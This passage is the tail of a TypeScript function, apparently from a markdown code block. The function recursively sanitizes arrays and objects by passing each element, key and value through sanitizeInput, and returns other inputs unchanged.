    return input.map(sanitizeInput);
  }

  if (input && typeof input === 'object') {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(input)) {
      sanitized[sanitizeInput(key)] = sanitizeInput(value);
    }
    return sanitized;
  }

  return input;
}
```
